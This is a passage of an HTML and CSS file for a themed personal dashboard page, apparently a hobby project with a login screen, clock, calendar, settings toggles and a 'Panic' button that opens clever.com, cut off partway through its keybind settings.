<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enhanced Private System</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap');
    
    :root {
      --primary-bg: #0a0a0a;
      --secondary-bg: #1a1a1a;
      --accent-color: #ff4500; /* Orange */
      --accent-secondary: #ff6b35; /* Lighter Orange */
      --text-primary: #ffffff;
      --text-secondary: #cccccc;
      --border-color: #333;
      --success-color: #00ff41;
      --warning-color: #ffaa00;
      --error-color: #ff0040;
    }

    /* Theme Definitions */
    .theme-orange {
      --accent-color: #ff4500;
      --accent-secondary: #ff6b35;
    }
    .theme-blue {
      --accent-color: #0066cc;
      --accent-secondary: #004499;
    }
    .theme-green {
      --accent-color: #00cc44;
      --accent-secondary: #009933;
    }
    .theme-red {
      --accent-color: #cc0044;
      --accent-secondary: #990033;
    }
    .theme-purple {
      --accent-color: #8800cc;
      --accent-secondary: #6600aa;
    }
    .theme-amber {
      --accent-color: #ffaa00;
      --accent-secondary: #ff8800;
    }
    .theme-teal {
      --accent-color: #00aaaa;
      --accent-secondary: #008888;
    }
    .theme-pink {
      --accent-color: #ff0088;
      --accent-secondary: #cc0066;
    }
    /* Add more themes here if needed */


    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--primary-bg);
      color: var(--text-primary);
      overflow-x: hidden;
      transition: background 0.3s ease, color 0.3s ease;
    }

    /* Initialization Screen */
    .init-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f0f0f);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 1;
      visibility: visible;
      transition: opacity 0.5s ease, visibility 0.5s ease;
    }
    .init-screen.hidden {
      opacity: 0;
      visibility: hidden;
    }

    .rotating-cube {
      width: 80px;
      height: 80px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 2s infinite linear;
      margin-bottom: 30px;
    }

    .cube-face {
      position: absolute;
      width: 80px;
      height: 80px;
      background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
      border: 2px solid #fff;
      opacity: 0.8;
    }

    .cube-face.front { transform: rotateY(0deg) translateZ(40px); }
    .cube-face.back { transform: rotateY(180deg) translateZ(40px); }
    .cube-face.right { transform: rotateY(90deg) translateZ(40px); }
    .cube-face.left { transform: rotateY(-90deg) translateZ(40px); }
    .cube-face.top { transform: rotateX(90deg) translateZ(40px); }
    .cube-face.bottom { transform: rotateX(-90deg) translateZ(40px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg); }
    }

    .init-text {
      font-family: 'Orbitron', monospace;
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(45deg, var(--accent-color), var(--error-color));
      background-size: 200% 200%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: gradientShift 3s ease-in-out infinite;
      text-align: center;
    }

    @keyframes gradientShift {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }

    .code-rain {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      opacity: 0.3;
      overflow: hidden; /* Ensure code chars don't overflow */
    }

    .code-char {
      position: absolute;
      color: var(--success-color);
      font-family: 'Courier New', monospace;
      font-size: 12px;
      animation: fall 3s linear infinite;
    }

    @keyframes fall {
      0% { transform: translateY(-100vh); opacity: 1; }
      100% { transform: translateY(100vh); opacity: 0; }
    }

    /* Enhanced Login Styles */
    .login-container {
      min-height: 100vh;
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      position: relative;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s ease;
    }
    .login-container.active {
      opacity: 1;
      visibility: visible;
    }

    .login-quickbar {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(10px);
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 1000;
      border-bottom: 1px solid var(--border-color);
    }

    .login-quickbar button {
      background: var(--accent-color);
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 12px;
      transition: all 0.3s ease;
      margin: 0 5px;
    }

    .login-quickbar button:hover {
      background: var(--accent-secondary);
      transform: translateY(-2px);
    }

    .panic-btn {
      background: var(--error-color) !important;
    }

    .login-box {
      background: rgba(26, 26, 26, 0.95);
      backdrop-filter: blur(15px);
      border: 3px solid var(--accent-color);
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
      width: 420px;
      padding: 40px 30px;
      text-align: center;
      position: relative;
      margin-top: 60px;
      transition: all 0.3s ease;
    }

    .login-box.error-shake {
      animation: shake 0.5s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }

    .login-box h2 {
      font-family: 'Orbitron', monospace;
      font-size: 28px;
      font-weight: 900;
      margin-bottom: 30px;
      background: linear-gradient(45deg, var(--accent-color), #fff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .login-box input {
      width: 100%;
      padding: 15px;
      background: rgba(30, 30, 30, 0.8);
      border: 2px solid var(--border-color);
      color: white;
      border-radius: 10px;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    .login-box input:focus {
      border-color: var(--accent-color);
      box-shadow: 0 0 15px rgba(255, 69, 0, 0.3);
      outline: none;
    }

    .toggle-container {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin: 15px 0;
      padding: 10px;
      background: rgba(30, 30, 30, 0.5);
      border-radius: 10px;
    }

    .toggle-switch {
      position: relative;
      width: 50px;
      height: 25px;
      background: #333;
      border-radius: 25px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .toggle-switch.active {
      background: var(--success-color);
    }

    .toggle-slider {
      position: absolute;
      top: 2px;
      left: 2px;
      width: 21px;
      height: 21px;
      background: white;
      border-radius: 50%;
      transition: all 0.3s ease;
    }

    .toggle-switch.active .toggle-slider {
      transform: translateX(25px);
    }

    .submit-btn {
      width: 100%;
      padding: 15px;
      background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
      color: white;
      font-size: 18px;
      font-weight: 700;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(255, 69, 0, 0.4);
    }

    .time-date-box {
      background: rgba(30, 30, 30, 0.8);
      border: 2px solid var(--border-color);
      border-radius: 15px;
      padding: 20px;
      margin-top: 20px;
      text-align: center;
    }

    .time-display {
      font-family: 'Orbitron', monospace;
      font-size: 24px;
      font-weight: 700;
      color: var(--accent-color);
      margin-bottom: 10px;
    }

    .date-display {
      font-size: 16px;
      color: var(--text-secondary);
    }

    /* Dashboard Styles */
    .dashboard {
      min-height: 100vh;
      background: var(--primary-bg);
      padding: 20px;
      display: none;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s ease;
    }

    .dashboard.active {
      display: block;
      opacity: 1;
      visibility: visible;
    }

    .dashboard-header {
      background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
      padding: 20px 30px;
      border-radius: 15px;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: white;
    }

    .dashboard-quickbar {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 20px;
      padding: 15px;
      background: var(--secondary-bg);
      border-radius: 15px;
      border: 1px solid var(--border-color);
    }

    .search-container {
      position: relative;
      flex: 1;
      max-width: 300px;
    }

    .search-bar {
      width: 100%;
      padding: 10px 40px 10px 15px;
      background: var(--primary-bg);
      border: 2px solid var(--border-color);
      border-radius: 25px;
      color: white;
      font-size: 14px;
    }

    .search-btn {
      position: absolute;
      right: 5px;
      top: 50%;
      transform: translateY(-50%);
      background: var(--accent-color);
      border: none;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      color: white;
      cursor: pointer;
    }

    .quick-btn {
      background: var(--accent-color);
      color: white;
      border: none;
      padding: 10px 15px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 12px;
      transition: all 0.3s ease;
      white-space: nowrap;
    }

    .quick-btn:hover {
      background: var(--accent-secondary);
      transform: translateY(-2px);
    }

    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: linear-gradient(135deg, var(--success-color), #00cc33);
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
      z-index: 1000;
      animation: slideIn 0.5s ease;
      display: flex; /* Ensure icon and text are aligned */
      align-items: center;
      gap: 10px;
    }

    @keyframes slideIn {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }

    .panels-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }

    .panel {
      background: var(--secondary-bg);
      border: 1px solid var(--border-color);
      border-radius: 15px;
      padding: 20px;
      position: relative;
      /* cursor: move; /* Removed for non-movable */
      transition: all 0.3s ease;
      resize: both; /* Resizable */
      overflow: auto;
      min-height: 200px;
    }

    .panel:hover {
      box-shadow: 0 5px 20px rgba(255, 69, 0, 0.2);
    }

    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border-color);
    }

    .panel-title {
      font-size: 18px;
      font-weight: 700;
      color: var(--accent-color);
    }

    .panel-controls {
      display: flex;
      gap: 5px;
    }

    .panel-btn {
      background: none;
      border: 1px solid var(--border-color);
      color: var(--text-secondary);
      border-radius: 4px;
      width: 25px;
      height: 25px;
      cursor: pointer;
      font-size: 10px;
      transition: all 0.3s ease;
    }

    .panel-btn:hover {
      background: var(--accent-color);
      color: white;
    }

    .calendar-grid {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 15px;
    }

    .calendar-cell {
      aspect-ratio: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--primary-bg);
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-size: 12px;
    }

    .calendar-cell:hover {
      background: var(--accent-color);
    }

    .calendar-cell.today {
      background: var(--accent-color);
      color: white;
      font-weight: bold;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .wifi-item {
      padding: 10px;
      border-radius: 8px;
      text-align: center;
      font-size: 12px;
      font-weight: 500;
    }

    .wifi-high { background: var(--success-color); color: black; }
    .wifi-medium { background: var(--warning-color); color: black; }
    .wifi-low { background: var(--error-color); color: white; }

    /* Settings Modal */
    .settings-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 2000;
    }

    .settings-content {
      background: var(--secondary-bg);
      border: 2px solid var(--accent-color);
      border-radius: 20px;
      padding: 30px;
      width: 90%;
      max-width: 800px;
      max-height: 80vh;
      overflow-y: auto;
    }

    .settings-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }

    .setting-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px;
      background: var(--primary-bg);
      border-radius: 10px;
      border: 1px solid var(--border-color);
    }

    /* Drawing Tools */
    .drawing-tools {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 15px;
      padding: 15px;
      background: var(--primary-bg);
      border-radius: 10px;
    }

    .tool-btn {
      padding: 8px 12px;
      background: var(--accent-color);
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .tool-btn:hover, .tool-btn.active {
      background: var(--accent-secondary);
      transform: scale(1.05);
    }

    .color-picker {
      width: 30px;
      height: 30px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .thickness-slider {
      width: 100px;
      accent-color: var(--accent-color);
    }

    /* Timer/Stopwatch */
    .timer-display {
      font-family: 'Orbitron', monospace;
      font-size: 36px;
      font-weight: 700;
      color: var(--accent-color);
      text-align: center;
      margin: 20px 0;
    }

    .timer-controls {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-top: 15px;
    }

    /* Activity Logs */
    .log-entry {
      padding: 10px;
      background: var(--primary-bg);
      border-left: 4px solid var(--accent-color);
      margin-bottom: 10px;
      border-radius: 6px;
      font-size: 12px;
      display: flex;
      justify-content: space-between;
    }

    .log-time {
      color: var(--text-secondary);
      font-size: 10px;
    }

    /* Stats Display */
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 15px;
      margin-top: 15px;
    }

    .stat-item {
      text-align: center;
      padding: 15px;
      background: var(--primary-bg);
      border-radius: 10px;
      border: 1px solid var(--border-color);
    }

    .stat-number {
      font-family: 'Orbitron', monospace;
      font-size: 24px;
      font-weight: 700;
      color: var(--accent-color);
    }

    .stat-label {
      font-size: 12px;
      color: var(--text-secondary);
      margin-top: 5px;
    }

    /* Themes */
    .theme-selector {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .theme-option {
      aspect-ratio: 1;
      border-radius: 10px;
      cursor: pointer;
      border: 3px solid transparent;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: bold;
    }

    .theme-option:hover, .theme-option.active {
      border-color: var(--accent-color);
      transform: scale(1.05);
    }

    /* Calculator */
    .calculator {
      background: var(--primary-bg);
      border-radius: 15px;
      padding: 20px;
      margin-top: 15px;
    }

    .calc-display {
      background: var(--secondary-bg);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 15px;
      text-align: right;
      font-family: 'Orbitron', monospace;
      font-size: 24px;
      color: var(--accent-color);
      margin-bottom: 15px;
      min-height: 60px;
    }

    .calc-buttons {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }

    .calc-btn {
      aspect-ratio: 1;
      border: none;
      border-radius: 8px;
      background: var(--secondary-bg);
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .calc-btn:hover {
      background: var(--accent-color);
    }

    .calc-btn.operator {
      background: var(--accent-color);
    }

    .calc-btn.equals {
      background: var(--success-color);
      color: black;
    }

    /* Media Player */
    .media-container {
      background: var(--primary-bg);
      border-radius: 15px;
      padding: 20px;
      margin-top: 15px;
    }

    .media-input {
      width: 100%;
      padding: 10px;
      background: var(--secondary-bg);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      color: white;
      margin-bottom: 15px;
    }

    .media-frame {
      width: 100%;
      height: 400px;
      border: 1px solid var(--border-color);
      border-radius: 8px;
      background: var(--secondary-bg);
    }

    /* Keybinds */
    .keybind-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      background: var(--primary-bg);
      border-radius: 8px;
      margin-bottom: 10px;
    }

    .keybind-input {
      background: var(--secondary-bg);
      border: 1px solid var(--border-color);
      border-radius: 4px;
      padding: 5px 10px;
      color: white;
      font-family: 'Courier New', monospace;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .login-box {
        width: 90%;
        margin: 20px auto;
      }
      
      .panels-grid {
        grid-template-columns: 1fr;
      }
      
      .dashboard-quickbar {
        flex-direction: column;
        gap: 10px;
      }
      
      .search-container {
        max-width: 100%;
      }
    }

    /* Loading Animation */
    .loading-cube {
      width: 60px;
      height: 60px;
      position: relative;
      transform-style: preserve-3d;
      animation: loadingRotate 1.5s infinite linear;
    }

    .loading-face {
      position: absolute;
      width: 60px;
      height: 60px;
      background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
      border: 1px solid #fff;
      opacity: 0.9;
    }

    .loading-face.front { transform: rotateY(0deg) translateZ(30px); }
    .loading-face.back { transform: rotateY(180deg) translateZ(30px); }
    .loading-face.right { transform: rotateY(90deg) translateZ(30px); }
    .loading-face.left { transform: rotateY(-90deg) translateZ(30px); }
    .loading-face.top { transform: rotateX(90deg) translateZ(30px); }
    .loading-face.bottom { transform: rotateX(-90deg) translateZ(30px); }

    @keyframes loadingRotate {
      0% { transform: rotateX(0deg) rotateY(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg); }
    }

    /* Hidden by default */
    .hidden { display: none !important; }
  </style>
</head>
<body>

<!-- Initialization Screen -->
<div id="initScreen" class="init-screen">
  <div class="rotating-cube">
    <div class="cube-face front"></div>
    <div class="cube-face back"></div>
    <div class="cube-face right"></div>
    <div class="cube-face left"></div>
    <div class="cube-face top"></div>
    <div class="cube-face bottom"></div>
  </div>
  <div id="initText" class="init-text">Initializing System...</div>
  <div class="code-rain" id="codeRain"></div>
</div>

<!-- Login Screen -->
<div id="loginScreen" class="login-container hidden">
  <div class="login-quickbar">
    <div class="flex items-center gap-2">
      <button class="panic-btn" onclick="window.open('https://clever.com', '_blank')">
        <i class="fas fa-exclamation-triangle"></i> Panic
      </button>
    </div>
    <div class="flex items-center gap-2">
      <button onclick="adjustZoom(0.1)"><i class="fas fa-search-plus"></i> Zoom In</button>
      <button onclick="adjustZoom(-0.1)"><i class="fas fa-search-minus"></i> Zoom Out</button>
    </div>
  </div>

  <div class="login-box" id="loginBox">
    <h2><i class="fas fa-shield-alt"></i> Private System</h2>
    
    <div class="input-group">
      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off">
    </div>
    
    <div class="input-group">
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off">
    </div>
    
    <div class="input-group">
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off">
    </div>

    <div class="toggle-container">
      <span>Show Password</span>
      <div class="toggle-switch" id="showPasswordToggle">
        <div class="toggle-slider"></div>
      </div>
    </div>

    <button class="submit-btn" id="submitBtn">
      <i class="fas fa-sign-in-alt"></i> ACCESS SYSTEM
    </button>

    <div id="errorMsg" class="text-red-400 mt-4 text-sm"></div>
    <div id="attemptsText" class="text-yellow-400 mt-2 text-sm">Attempts Left: 3</div>
  </div>

  <div class="time-date-box">
    <div class="time-display" id="currentTime">00:00:00</div>
    <div class="date-display" id="currentDate">Loading...</div>
    <div class="toggle-container mt-4">
      <span>24-Hour Format</span>
      <div class="toggle-switch" id="timeFormatToggle">
        <div class="toggle-slider"></div>
      </div>
    </div>
  </div>
</div>

<!-- Loading Screen -->
<div id="loadingScreen" class="init-screen hidden">
  <div class="loading-cube">
    <div class="loading-face front"></div>
    <div class="loading-face back"></div>
    <div class="loading-face right"></div>
    <div class="loading-face left"></div>
    <div class="loading-face top"></div>
    <div class="loading-face bottom"></div>
  </div>
  <div class="init-text">Loading Dashboard...</div>
  <div class="code-rain" id="loadingCodeRain"></div>
</div>

<!-- Dashboard -->
<div id="dashboard" class="dashboard">
  <!-- Welcome Notification -->
  <div id="welcomeNotification" class="notification hidden">
    <i class="fas fa-user-check"></i> Welcome <span id="loggedUser">User</span>!
  </div>

  <!-- Dashboard Header -->
  <div class="dashboard-header">
    <div>
      <h1 class="text-2xl font-bold"><i class="fas fa-tachometer-alt"></i> Enhanced Private Dashboard</h1>
      <p class="text-sm opacity-80">User: <span id="currentUser">Beta.user</span> | ID: <span id="currentUserID">281573</span></p>
    </div>
    <div class="bg-white text-black px-4 py-2 rounded-lg font-bold">
      Version 2.0.0
    </div>
  </div>

  <!-- Quick Bar with Search -->
  <div class="dashboard-quickbar">
    <div class="search-container">
      <input type="text" class="search-bar" id="searchBar" placeholder="Search panels, features...">
      <button class="search-btn" onclick="performSearch()"><i class="fas fa-search"></i></button>
    </div>
    
    <button class="quick-btn" onclick="togglePanel('settingsModal')">
      <i class="fas fa-cog"></i> Settings
    </button>
    <button class="quick-btn" onclick="downloadActivityLogs()">
      <i class="fas fa-download"></i> Download Logs
    </button>
    <button class="quick-btn" onclick="togglePanel('timerPanel')">
      <i class="fas fa-stopwatch"></i> Timer
    </button>
    <button class="quick-btn" onclick="togglePanel('notesPanel')">
      <i class="fas fa-pen"></i> Notes
    </button>
    <button class="quick-btn" onclick="togglePanel('calculatorPanel')">
      <i class="fas fa-calculator"></i> Calculator
    </button>
    <button class="quick-btn" onclick="togglePanel('mediaPanel')">
      <i class="fas fa-play"></i> Media
    </button>
    <button class="quick-btn" onclick="showStats()">
      <i class="fas fa-chart-bar"></i> Stats
    </button>
    <button class="quick-btn" onclick="toggleTheme()">
      <i class="fas fa-palette"></i> Theme
    </button>
    <button class="quick-btn" onclick="logout()">
      <i class="fas fa-sign-out-alt"></i> Logout
    </button>
  </div>

  <!-- Main Panels Grid -->
  <div class="panels-grid" id="panelsGrid">
    <!-- Calendar Panel -->
    <div class="panel" data-panel="calendar">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-calendar"></i> Calendar</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="minimizePanel(this)"><i class="fas fa-minus"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div class="calendar-grid" id="calendarGrid">
        <!-- Calendar will be generated here -->
      </div>
    </div>

    <!-- Random Facts Panel -->
    <div class="panel" data-panel="facts">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-lightbulb"></i> Random Facts</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="refreshFact()"><i class="fas fa-sync"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div id="randomFact" class="text-sm">
        Did you know? The human brain contains approximately 86 billion neurons!
      </div>
    </div>

    <!-- Daily Quotes Panel -->
    <div class="panel" data-panel="quotes">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-quote-left"></i> Daily Quote</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="refreshQuote()"><i class="fas fa-sync"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div id="dailyQuote" class="text-sm italic">
        "The only way to do great work is to love what you do." - Steve Jobs
      </div>
    </div>

    <!-- Updates Panel -->
    <div class="panel" data-panel="updates">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-sync-alt"></i> System Updates</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div class="space-y-2">
        <div class="p-2 bg-orange-900 rounded text-xs">Enhanced UI v2.0 Deployed</div>
        <div class="p-2 bg-orange-900 rounded text-xs">New Security Features Added</div>
        <div class="p-2 bg-orange-900 rounded text-xs">Performance Optimizations</div>
      </div>
    </div>

    <!-- Notifications Panel -->
    <div class="panel" data-panel="notifications">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-bell"></i> Notifications</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="clearNotifications()"><i class="fas fa-trash"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div id="notificationsList" class="space-y-2">
        <div class="p-2 bg-blue-900 rounded text-xs">System initialized successfully</div>
        <div class="p-2 bg-green-900 rounded text-xs">All security checks passed</div>
      </div>
    </div>

    <!-- WiFi Information Panel -->
    <div class="panel" data-panel="wifi">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-wifi"></i> WiFi Information</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="refreshWifi()"><i class="fas fa-sync"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div class="wifi-grid" id="wifiGrid">
        <div class="wifi-item" data-level="High">Network_A<br>High</div>
        <div class="wifi-item" data-level="Medium">Network_B<br>Medium</div>
        <div class="wifi-item" data-level="Low">Network_C<br>Low</div>
        <div class="wifi-item" data-level="High">Network_D<br>High</div>
      </div>
    </div>

    <!-- Activity Logs Panel -->
    <div class="panel" data-panel="activityLogs">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-list"></i> Activity Logs</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="clearActivityLogs()"><i class="fas fa-trash"></i></button>
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div id="activityLogsList" class="max-h-40 overflow-y-auto">
        <!-- Activity logs will be populated here -->
      </div>
    </div>

    <!-- Login History Panel -->
    <div class="panel" data-panel="loginHistory">
      <div class="panel-header">
        <div class="panel-title"><i class="fas fa-history"></i> Login History</div>
        <div class="panel-controls">
          <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
        </div>
      </div>
      <div id="loginHistoryList" class="space-y-2">
        <!-- Login history will be populated here -->
      </div>
    </div>
  </div>

  <!-- Settings Modal -->
  <div id="settingsModal" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-cog"></i> System Settings</h2>
        <button onclick="togglePanel('settingsModal')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="settings-grid">
        <div class="setting-item">
          <span>Dark Mode</span>
          <div class="toggle-switch" id="darkModeToggle" onclick="toggleSetting(this, 'darkMode')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Auto-save Notes</span>
          <div class="toggle-switch" id="autoSaveNotesToggle" onclick="toggleSetting(this, 'autoSaveNotes')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Sound Notifications</span>
          <div class="toggle-switch" id="soundNotificationsToggle" onclick="toggleSetting(this, 'soundNotifications')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Auto-refresh Data</span>
          <div class="toggle-switch" id="autoRefreshDataToggle" onclick="toggleSetting(this, 'autoRefreshData')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Compact View</span>
          <div class="toggle-switch" id="compactViewToggle" onclick="toggleSetting(this, 'compactView')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Show Animations</span>
          <div class="toggle-switch" id="showAnimationsToggle" onclick="toggleSetting(this, 'showAnimations')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>High Contrast</span>
          <div class="toggle-switch" id="highContrastToggle" onclick="toggleSetting(this, 'highContrast')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Auto-backup</span>
          <div class="toggle-switch" id="autoBackupToggle" onclick="toggleSetting(this, 'autoBackup')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Security Mode</span>
          <div class="toggle-switch" id="securityModeToggle" onclick="toggleSetting(this, 'securityMode')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Advanced Logging</span>
          <div class="toggle-switch" id="advancedLoggingToggle" onclick="toggleSetting(this, 'advancedLogging')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Performance Mode</span>
          <div class="toggle-switch" id="performanceModeToggle" onclick="toggleSetting(this, 'performanceMode')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Developer Mode</span>
          <div class="toggle-switch" id="developerModeToggle" onclick="toggleSetting(this, 'developerMode')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Experimental Features</span>
          <div class="toggle-switch" id="experimentalFeaturesToggle" onclick="toggleSetting(this, 'experimentalFeatures')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Data Compression</span>
          <div class="toggle-switch" id="dataCompressionToggle" onclick="toggleSetting(this, 'dataCompression')">
            <div class="toggle-slider"></div>
          </div>
        </div>
        <div class="setting-item">
          <span>Real-time Sync</span>
          <div class="toggle-switch" id="realtimeSyncToggle" onclick="toggleSetting(this, 'realtimeSync')">
            <div class="toggle-slider"></div>
          </div>
        </div>
      </div>

      <!-- Keybinds Section -->
      <div class="mt-8">
        <h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-keyboard"></i> Keybinds Configuration</h3>
        <div class="space-y-3" id="keybindsList">
          <div class="keybind-item">
            <span>Open Settings</span>
            <input type="text" class="keybind-input" data-action="openSettings" value="Ctrl+," placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Quick Search</span>
            <input type="text" class="keybind-input" data-action="quickSearch" value="Ctrl+K" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
